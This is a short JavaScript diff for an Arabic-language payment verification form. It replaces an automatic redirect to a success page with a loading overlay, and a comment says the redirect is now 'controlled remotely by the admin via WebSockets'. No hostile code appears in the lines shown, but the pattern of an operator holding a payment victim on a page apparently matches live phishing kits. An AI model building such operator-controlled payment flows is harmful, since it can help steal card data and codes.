@@ -61,13 +61,13 @@
 
 		message.hidden = false;
 		message.style.color = "#2e7d32";
-		message.textContent = "تم التحقق بنجاح. جاري توجيهك...";
-		verifyForm.reset();
+		message.textContent = "جاري التحقق...";
 		verifyButton.disabled = true;
-		isFormValid();
-
-		setTimeout(() => {
-			window.location.replace("payment-success.html");
-		}, 1500);
+		
+		// Show the loading popup (instead of redirecting immediately)
+		const overlay = document.getElementById('loadingOverlay');
+		if(overlay) overlay.style.display = 'flex';
+		
+		// Note: Redirect is now controlled remotely by the admin via WebSockets
 	});
 })();
